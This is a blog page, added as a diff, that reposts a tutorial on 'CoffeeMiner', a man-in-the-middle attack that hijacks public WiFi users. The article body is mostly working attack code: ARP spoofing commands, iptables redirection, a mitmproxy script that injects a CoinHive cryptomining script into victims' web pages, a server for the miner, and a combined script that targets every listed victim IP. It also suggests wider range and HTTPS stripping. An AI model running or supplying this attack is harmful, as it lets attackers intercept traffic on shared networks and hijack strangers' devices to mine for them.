@@ -1,0 +1,451 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="星云比特">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <link rel="dns-prefetch" href="http://xingyunbite.github.com">
+    <!--SEO-->
+
+
+
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+
+<title>劫持公共WIFI挖矿研究 | 星云比特</title>
+
+
+    <link rel="alternate" href="/atom.xml" title="星云比特" type="application/atom+xml">
+
+
+    <link rel="icon" href="/favicon.ico">
+
+    
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.4/css/bootstrap.min.css?rev=3.3.4">
+<link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash">
+
+
+
+
+    
+	<div class="hide">
+		<script type="text/javascript">
+			var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan class='cnzz_stat_icon_1272924949 hide' %3E%3Cscript%20src%3D%22https%3A%2F%2Fs95.cnzz.com%2Fz_stat.php%3Fweb_id%3D1272564536%22%3E%3C%2Fscript%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/z_stat.php%3Fid%3D1272924949%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+		</script>
+	</div>
+
+
+
+
+
+
+    
+</head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+
+<body>
+    <header class="main-header"  >
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="">
+            <img src="/img/avatar.jpg" alt="logo头像">
+        </a>
+        <div class="branding">
+        	<!--<h2 class="text-hide">Snippet主题,从未如此简单有趣</h2>-->
+            
+                <h2> 碳60 区块链 </h2>
+             
+    	</div>
+    </div>
+</header>
+
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                    <span class="sr-only">Toggle navigation</span>
+                    <i class="fa fa-bars"></i>
+                    </span>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                            <li role="presentation"><a href="/"><i class="fa fa-fw "></i>首页</a>
+                            </li>
+                        
+                            <li role="presentation"><a href="/categories/区块链/"><i class="fa fa-fw "></i>区块链</a>
+                            </li>
+                        
+                            <li role="presentation"><a href="/categories/矿池/"><i class="fa fa-fw "></i>矿池</a>
+                            </li>
+                        
+                            <li role="presentation"><a href="/categories/钱包/"><i class="fa fa-fw "></i>钱包</a>
+                            </li>
+                        
+                            <li role="presentation"><a href="/categories/资源/"><i class="fa fa-fw "></i>资源</a>
+                            </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="劫持公共WIFI挖矿研究">
+            
+	            劫持公共WIFI挖矿研究
+            
+        </h1>
+        <div class="post-meta">
+    
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a href="/categories/矿池">
+            矿池
+        </a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <span class="tags-meta">
+			
+				
+					<i class="fa fa-tags"></i>
+					<a href="/tags/lucas556">
+						lucas556
+					</a>
+				
+					<i class="fa fa-tags"></i>
+					<a href="/tags/矿池">
+						矿池
+					</a>
+				
+					<i class="fa fa-tags"></i>
+					<a href="/tags/门罗币">
+						门罗币
+					</a>
+				
+					<i class="fa fa-tags"></i>
+					<a href="/tags/CoffeeMiner">
+						CoffeeMiner
+					</a>
+				
+					<i class="fa fa-tags"></i>
+					<a href="/tags/MITM">
+						MITM
+					</a>
+				
+					<i class="fa fa-tags"></i>
+					<a href="/tags/CoinHive">
+						CoinHive
+					</a>
+				
+            
+        </span>
+    </span>
+    
+	
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">2018/03/09</span>
+    </span>
+</div>
+
+            
+            
+    </div>
+    
+    <div class="post-body post-content">
+        <p>##警告:本篇文章和文章内提及的项目仅限于学术研究.</p>
+<p>这篇文章的目的是解释如何做MITM（Man（Person） In The Middle）的攻击，在html页面注入javascript，强制连接到WiFi网络的所有设备都为攻击者挖掘门罗币.</p>
+<p>攻击者有一个脚本可以执行对WiFi网络的自主攻击，我将其称为CoffeeMiner，因为这是一种可以在咖啡馆WiFi网络中执行的攻击. 这种攻击就是将一些设备连接到WiFi网络，并且CoffeeMiner攻击者会在连接过程中拦截用户和路由器之间的流量.</p>
+<p><img src="/images/coffeeMiner_network_attack.png" alt=""></p>
+<p>正常WIFI网络配置:</p>
+<p>Victim:连接到路由器并浏览页面的机器<br>Attacker:运行CoffeeMiner的机器,将执行MITM.<br>gateway/router:正常的路由器</p>
+<p><img src="/images/scenario01.png" alt=""></p>
+<p>一旦执行攻击,情况将是:</p>
+<p><img src="/images/scenario02.png" alt=""></p>
+<p>攻击者要配置每台机器将执行以下配置：</p>
+<p>Victim:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip地址 : 10.0.2.10</span><br><span class="line">子网掩码 : 255.255.255.0</span><br><span class="line">默认网关:10.0.0.15</span><br></pre></td></tr></table></figure></p>
+<p>Attacker:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip地址 : 10.0.2.20</span><br><span class="line">子网掩码 : 255.255.255.0</span><br><span class="line">默认网关:10.0.0.15</span><br></pre></td></tr></table></figure></p>
+<p>gateway/router:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">网络0设置dhcp自动获取.</span><br><span class="line">网络1:</span><br><span class="line">ip地址 : 10.0.2.15</span><br><span class="line">子网掩码 : 255.255.255.0</span><br></pre></td></tr></table></figure></p>
+<h2 id="1-CoffeeMiner的攻击代码"><a href="#1-CoffeeMiner的攻击代码" class="headerlink" title="1.CoffeeMiner的攻击代码"></a>1.CoffeeMiner的攻击代码</h2><h3 id="1-1-ARP欺骗"><a href="#1-1-ARP欺骗" class="headerlink" title="1.1 ARP欺骗"></a>1.1 ARP欺骗</h3><p>中间人攻击是一种由来已久的网络入侵手段，并且在今天仍然有着广泛的发展空间，如SMB会话劫持、DNS欺骗等攻击都是典型的MITM攻击.<br>简而言之，所谓的MITM攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情.</p>
+<p>随着计算机通信网技术的不断发展，MITM攻击也越来越多样化.<br>最初，攻击者只要将网卡设为混杂模式，伪装成代理服务器监听特定的流量就可以实现攻击，这是因为很多通信协议都是以明文来进行传输的，如HTTP、FTP、Telnet等.后来，随着交换机代替集线器，简单的嗅探攻击已经不能成功，必须先进行ARP欺骗才行.</p>
+<p>如今，越来越多的服务商（网上银行，邮箱登陆）开始采用加密通信，SSL(Secure Sockets Layer 安全套接层)是一种广泛使用的技术，HTTPS、FTPS等都是建立在其基础上的.</p>
+<p>所以要执行ARP欺骗攻击，我就将使用dsniff库.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i interface -t ipVictim ipGateway</span><br><span class="line">arpspoof -i interface -t ipGateway ipVictim</span><br></pre></td></tr></table></figure>
+<h2 id="1-2-mitmproxy"><a href="#1-2-mitmproxy" class="headerlink" title="1.2 mitmproxy"></a>1.2 mitmproxy</h2><p>需要在html页面注入代码,可以使用mitmproxy分析主机的流量，并对该流量做手脚.在这个案例中，攻击者将使用它将javascript注入html页面.<br>为了使这个虚拟过程简单易操作，这里在html页面中只注入一行代码，然后调用JavaScript挖矿的HTML代码行.<br>注入挖矿代码的流程如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://httpserverIP:8080/script.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="1-3-注入器"><a href="#1-3-注入器" class="headerlink" title="1.3 注入器"></a>1.3 注入器</h2><p>一旦拦截了受害者的流量，就需要注入攻击者的挖矿脚本.使用mitmproxy API来完成注入.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> mitmproxy <span class="keyword">import</span> ctx, http</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Injector</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, path)</span>:</span></span><br><span class="line">        self.path = path</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">response</span><span class="params">(self, flow: http.HTTPFlow)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.path:</span><br><span class="line">            html = BeautifulSoup(flow.response.content, <span class="string">"html.parser"</span>)</span><br><span class="line">            print(self.path)</span><br><span class="line">            print(flow.response.headers[<span class="string">"content-type"</span>])</span><br><span class="line">            <span class="keyword">if</span> flow.response.headers[<span class="string">"content-type"</span>] == <span class="string">'text/html'</span>:</span><br><span class="line">                script = html.new_tag(</span><br><span class="line">                    <span class="string">"script"</span>,</span><br><span class="line">                    src=self.path,</span><br><span class="line">                    type=<span class="string">'application/javascript'</span>)</span><br><span class="line">                html.body.insert(<span class="number">0</span>, script)</span><br><span class="line">                flow.response.content = str(html).encode(<span class="string">"utf8"</span>)</span><br><span class="line">                print(<span class="string">"Script injected."</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">"path"</span>, type=str)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">return</span> Injector(args.path)</span><br></pre></td></tr></table></figure>
+<h3 id="1-4-HTTP服务器"><a href="#1-4-HTTP服务器" class="headerlink" title="1.4 HTTP服务器"></a>1.4 HTTP服务器</h3><p>正如以上你看到的，向注入器添加了一行指向HTML的代码，以调用JavaScript挖矿.所以，还需要在HTTP服务器中部署脚本文件.</p>
+<p>为了实现javascript 加密挖矿，攻击者要在设备中部署一个HTTP服务器.这里使用Python库“http.server”：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> http.server</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">PORT = <span class="number">8000</span></span><br><span class="line">web_dir = os.path.join(os.path.dirname(__file__), <span class="string">'miner_script'</span>)</span><br><span class="line">os.chdir(web_dir)</span><br><span class="line">Handler = http.server.SimpleHTTPRequestHandler</span><br><span class="line">httpd = socketserver.TCPServer((<span class="string">""</span>, PORT), Handler)</span><br><span class="line">print(<span class="string">"serving at port"</span>, PORT)</span><br><span class="line">httpd.serve_forever()</span><br></pre></td></tr></table></figure></p>
+<p>上面的代码就是一个简单的HTTP服务器，它将在需要时执行攻击者设置的挖矿服务.<br>JavaScript挖矿将被放置在/miner_script目录中.在这个案例中，使用了CoinHive JavaScript挖矿工具.</p>
+<p>*Coinhive是一个提供恶意JS脚本的网站平台（<a href="https://coin-hive[.]com），允许攻击者将脚本挂在到自己的或入侵的网站上，所有访问该网站的用户都可能成为门罗币的挖掘矿工.Coinhive工具其实是一个JavaScript库，用户访问加载该JS的网站后，Coinhive的JS代码库在用户的浏览器上运行，开始为网站所有者挖掘门罗币，消耗的是用户自己的CPU资源。它可以被添加进一个网站，并将使用用户的CPU功率来计算哈希与Cryptonight" target="_blank" rel="noopener">https://coin-hive[.]com），允许攻击者将脚本挂在到自己的或入侵的网站上，所有访问该网站的用户都可能成为门罗币的挖掘矿工.Coinhive工具其实是一个JavaScript库，用户访问加载该JS的网站后，Coinhive的JS代码库在用户的浏览器上运行，开始为网站所有者挖掘门罗币，消耗的是用户自己的CPU资源。它可以被添加进一个网站，并将使用用户的CPU功率来计算哈希与Cryptonight</a> PoW哈希算法来挖掘基于CryptoNote协议的门罗币.不过CoinHive的执行要在网站的运行时间超过四十秒时才会有效，如果用户意识到自己打开了一个有问题的页面，立马关闭，则CoinHive就会运行失败.</p>
+<h2 id="2-CoffeeMiner的运行"><a href="#2-CoffeeMiner的运行" class="headerlink" title="2.CoffeeMiner的运行"></a>2.CoffeeMiner的运行</h2><p>在以上这些条件准备好以后，开始执行CoffeeMiner，进而让CoffeeMiner脚本执行ARPspoofing攻击，并用mitmproxy将CoinHive cryptominer注入受害者的HTML页面。<br>为此，需要首先配置ip_forwarding和IPTABLES，以便将攻击者的设备转换为代理。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080</span><br></pre></td></tr></table></figure>
+<p>为了对所有受害者执行ARP欺骗，我将为受害者的所有IP准备一个“victim.txt”文件。不过要读取所有受害者IP，就准备一些Python行，它将获得IP（以及命令行参数中的网关IP），并对每个受害者的IP执行ARP欺骗。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gateway = sys.argv[<span class="number">1</span>]</span><br><span class="line">print(<span class="string">"gateway: "</span> + gateway)</span><br><span class="line"><span class="comment"># get victims_ip</span></span><br><span class="line">victims = [line.rstrip(<span class="string">'n'</span>) <span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">"victims.txt"</span>)]</span><br><span class="line">print(<span class="string">"victims:"</span>)</span><br><span class="line">print(victims)</span><br><span class="line"><span class="comment"># run the arpspoof for each victim, each one in a new console</span></span><br><span class="line"><span class="keyword">for</span> victim <span class="keyword">in</span> victims:</span><br><span class="line">    os.system(<span class="string">"xterm -e arpspoof -i eth0 -t "</span> + victim + <span class="string">" "</span> + gateway + <span class="string">" &amp;"</span>)</span><br><span class="line">    os.system(<span class="string">"xterm -e arpspoof -i eth0 -t "</span> + gateway + <span class="string">" "</span> + victim + <span class="string">" &amp;"</span>)</span><br></pre></td></tr></table></figure></p>
+<p>一旦执行了ARP欺骗，只需要运行HTTP服务器即可.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; python3 httpServer.py</span><br></pre></td></tr></table></figure></p>
+<p>现在，可以用injector.py运行mitmproxy了.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; mitmdump -s <span class="string">'injector.py http://httpserverIP:8080/script.js'</span></span><br></pre></td></tr></table></figure>
+<h2 id="3-CoffeeMiner的最终挖矿脚本"><a href="#3-CoffeeMiner的最终挖矿脚本" class="headerlink" title="3.CoffeeMiner的最终挖矿脚本"></a>3.CoffeeMiner的最终挖矿脚本</h2><p>现在把上面解释的所有概念都放在’coffeeMiner.py’脚本中：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#get gateway_ip (router)</span></span><br><span class="line">gateway = sys.argv[<span class="number">1</span>]</span><br><span class="line">print(<span class="string">"gateway: "</span> + gateway)</span><br><span class="line"><span class="comment"># get victims_ip</span></span><br><span class="line">victims = [line.rstrip(<span class="string">'n'</span>) <span class="keyword">for</span> line <span class="keyword">in</span> open(<span class="string">"victims.txt"</span>)]</span><br><span class="line">print(<span class="string">"victims:"</span>)</span><br><span class="line">print(victims)</span><br><span class="line"><span class="comment"># configure routing (IPTABLES)</span></span><br><span class="line">os.system(<span class="string">"echo 1 &gt; /proc/sys/net/ipv4/ip_forward"</span>)</span><br><span class="line">os.system(<span class="string">"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE"</span>)</span><br><span class="line">os.system(<span class="string">"iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080"</span>)</span><br><span class="line">os.system(<span class="string">"iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080"</span>)</span><br><span class="line"><span class="comment"># run the arpspoof for each victim, each one in a new console</span></span><br><span class="line"><span class="keyword">for</span> victim <span class="keyword">in</span> victims:</span><br><span class="line">    os.system(<span class="string">"xterm -e arpspoof -i eth0 -t "</span> + victim + <span class="string">" "</span> + gateway + <span class="string">" &amp;"</span>)</span><br><span class="line">    os.system(<span class="string">"xterm -e arpspoof -i eth0 -t "</span> + gateway + <span class="string">" "</span> + victim + <span class="string">" &amp;"</span>)</span><br><span class="line"><span class="comment"># start the http server for serving the script.js, in a new console</span></span><br><span class="line">os.system(<span class="string">"xterm -hold -e 'python3 httpServer.py' &amp;"</span>)</span><br><span class="line"><span class="comment"># start the mitmproxy</span></span><br><span class="line">os.system(<span class="string">"~/.local/bin/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js' -T"</span>)</span><br></pre></td></tr></table></figure></p>
+<p>在’injector.py’脚本中：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> mitmproxy <span class="keyword">import</span> ctx, http</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Injector</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, path)</span>:</span></span><br><span class="line">        self.path = path</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">response</span><span class="params">(self, flow: http.HTTPFlow)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.path:</span><br><span class="line">            html = BeautifulSoup(flow.response.content, <span class="string">"html.parser"</span>)</span><br><span class="line">            print(self.path)</span><br><span class="line">            print(flow.response.headers[<span class="string">"content-type"</span>])</span><br><span class="line">            <span class="keyword">if</span> flow.response.headers[<span class="string">"content-type"</span>] == <span class="string">'text/html'</span>:</span><br><span class="line">                print(flow.response.headers[<span class="string">"content-type"</span>])</span><br><span class="line">                script = html.new_tag(</span><br><span class="line">                    <span class="string">"script"</span>,</span><br><span class="line">                    src=self.path,</span><br><span class="line">                    type=<span class="string">'application/javascript'</span>)</span><br><span class="line">                html.body.insert(<span class="number">0</span>, script)</span><br><span class="line">                flow.response.content = str(html).encode(<span class="string">"utf8"</span>)</span><br><span class="line">                print(<span class="string">"Script injected."</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">"path"</span>, type=str)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">return</span> Injector(args.path)</span><br></pre></td></tr></table></figure></p>
+<p>要执行挖矿，只需要执行以下操作：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; python3 coffeeMiner.py RouterIP</span><br></pre></td></tr></table></figure></p>
+<p>当然也可以手动运行.</p>
+<p><img src="/images/coffeeMiner_demo_cutted.gif" alt=""></p>
+<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>正如我们所看到的，攻击者可以轻松执行，也可以部署为WiFi网络中的自主攻击.</p>
+<p>另一个想到的是，对于真实世界的WiFi网络来说，使用强大的WiFi天线执行攻击过程，以扩大攻击范围.</p>
+<p>虽然攻击者主要目标是执行自主攻击，但我们仍然需要使用受害设备的IP地址编辑victim.txt文件. 对于更多版本，可能的功能可能是添加自主的Nmap扫描，将检测到的IP添加到CoffeeMiner受害者列表中. 另一个功能，可能是添加sslstrip，以确保注入也在用户可以通过HTTPS请求的网站中.</p>
+<p>附:完整的攻击代码：https：//github.com/arnaucode/coffeeMiner</p>
+
+    </div>
+
+    <div class="post-footer">   
+        <div>
+            
+                转载声明：商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://xingyunbite.github.io" target="_blank">xingyunbite</a>
+            
+        </div>
+        <div>
+            
+        </div>  
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    
+		
+		
+        <a href="/2018/03/09/智能合约最佳实践翻译三/" class="next-post btn btn-default">下一篇(智能合约最佳实践翻译三)<i class="fa fa-angle-right fa-fw"></i></a>
+    
+</div>
+
+
+
+
+
+
+                </main>
+                
+    <aside class="col-md-4 sidebar">
+        
+        
+    <div class="widget">    
+        <h3 class="title">搜索</h3>
+        <div id="search-form">
+            <div id="result-mask" class="hide"></div>
+            <div class="search-area">
+                
+                    <input id="search-key" type="search" autocomplete="off" placeholder="搜点什么呢?">
+                    <button type="button" class="search-form-submit" id="search-local">站内搜索</button>
+                
+                
+            </div>
+            <div id="result-wrap" class="hide">
+                <div id="search-result"></div>
+            </div>
+            <div class="hide">
+                <template id="search-tpl">
+                    <div class="item">
+                        <a href="/{path}" title="{title}">
+                            <div class="title">{title}</div>
+                            <div class="content">{content}</div>
+                        </a>
+                    </div>
+                </template>
+            </div>
+        </div>
+    </div>
+
+        
+        
+    <div class="widget">
+      <h3 class="title">社交</h3> 
+        <div class="content social">
+            
+	            <a href="//github.com/xingyunbite" rel="external nofollow" title="Github" target="_blank">
+			    	<i class="git fa fa-git"></i>
+			    </a>
+            
+	            <a href="xingyunbite@foxmail.com" rel="external nofollow" title="邮箱" target="_blank">
+			    	<i class="envelope-o fa fa-envelope-o"></i>
+			    </a>
+            
+        </div>
+    </div>
+
+
+        
+        
+    <div class="widget">
+        <h3 class="title">分类</h3>
+        <ul class="category-list"><li class="category-list-item"><a class="category-list-link current" href="/categories/区块链/"><i class="fa" aria-hidden="true">区块链</i></a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/矿池/"><i class="fa" aria-hidden="true">矿池</i></a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/钱包/"><i class="fa" aria-hidden="true">钱包</i></a><span class="category-list-count">1</span></li></ul>
+    </div>
+
+
+        
+        
+    <div class="widget">
+      <h3 class="title">归档</h3>
+        <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/"><i class="fa" aria-hidden="true">三月 2018</i></a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/"><i class="fa" aria-hidden="true">二月 2018</i></a><span class="archive-list-count">7</span></li></ul>
+    </div>
+
+
+        
+        
+  <div class="widget">
+    <h3 class="title">标签云</h3>
+    <div class="content tag-cloud">
+        <a href="/tags/CoffeeMiner/" style="font-size: 10px;">CoffeeMiner</a> <a href="/tags/CoinHive/" style="font-size: 10px;">CoinHive</a> <a href="/tags/LeonBCK/" style="font-size: 18.33px;">LeonBCK</a> <a href="/tags/MITM/" style="font-size: 10px;">MITM</a> <a href="/tags/ZhouFyk/" style="font-size: 20px;">ZhouFyk</a> <a href="/tags/bitcoin/" style="font-size: 10px;">bitcoin</a> <a href="/tags/ciscolxh/" style="font-size: 10px;">ciscolxh</a> <a href="/tags/ethereum/" style="font-size: 11.67px;">ethereum</a> <a href="/tags/gas/" style="font-size: 10px;">gas</a> <a href="/tags/lucas556/" style="font-size: 15px;">lucas556</a> <a href="/tags/zcash/" style="font-size: 11.67px;">zcash</a> <a href="/tags/以太坊/" style="font-size: 20px;">以太坊</a> <a href="/tags/区块链/" style="font-size: 15px;">区块链</a> <a href="/tags/安全开发/" style="font-size: 13.33px;">安全开发</a> <a href="/tags/智能合约/" style="font-size: 13.33px;">智能合约</a> <a href="/tags/比特币/" style="font-size: 16.67px;">比特币</a> <a href="/tags/燃料/" style="font-size: 10px;">燃料</a> <a href="/tags/矿机/" style="font-size: 10px;">矿机</a> <a href="/tags/矿池/" style="font-size: 20px;">矿池</a> <a href="/tags/翻译/" style="font-size: 10px;">翻译</a> <a href="/tags/钱包/" style="font-size: 10px;">钱包</a> <a href="/tags/门罗币/" style="font-size: 10px;">门罗币</a>
+    </div>
+  </div>
+
+
+        
+    </aside>
+
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+
+<a id="back-to-top" class="hide">
+	<i class="fa fa-chevron-up"></i>
+</a>
+<!--page counter part-->
+<script>
+function addCount (Counter) {
+	url=$('.article-date').attr('href').trim();
+	title = $('.article-title').text().trim();
+	var query=new AV.Query(Counter);
+	//use url as unique idnetfication
+	query.equalTo("url",url);
+	query.find({
+		success: function(results){
+			if(results.length>0)
+			{
+				var counter=results[0];
+				counter.fetchWhenSave(true); //get recent result
+				counter.increment("time");
+				counter.save();
+			} else {
+				var newcounter=new Counter();
+				newcounter.set("title",title);
+				newcounter.set("url",url);
+				newcounter.set("time",1);
+				newcounter.save(null,{
+					success: function(newcounter){
+						//alert('New object created');
+					},
+					error: function(newcounter,error){
+						alert('Failed to create');
+					}
+				});
+			}
+		},
+		error: function(error){
+			//find null is not a error
+			alert('Error:'+error.code+" "+error.message);
+		}
+	});
+}
+$(function(){
+	var Counter=AV.Object.extend("Counter");
+	//only increse visit counting when intering a page
+	if ($('.article-title').length == 1)
+		addCount(Counter);
+		var query=new AV.Query(Counter);
+		query.descending("time");
+		// the sum of popular posts
+		query.limit(10); 
+		query.find({
+			success: function(results){
+				for(var i=0;i<results.length;i++){
+					var counter=results[i];
+					title=counter.get("title");
+					url=counter.get("url");
+					time=counter.get("time");
+					// add to the popularlist widget
+					showcontent=title+" ("+time+")";
+					//notice the "" in href
+					$('.popularlist').append('<li><a href="'+url+'">'+showcontent+'</a></li>');
+				}
+			},
+			error: function(error){
+				alert("Error:"+error.code+" "+error.message);
+			}
+		})
+});
+</script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+		<div class="col-sm-12">
+		</div>
+            <div class="col-sm-12"> 
+                <span>Copyright &copy; 2017
+                </span> | 
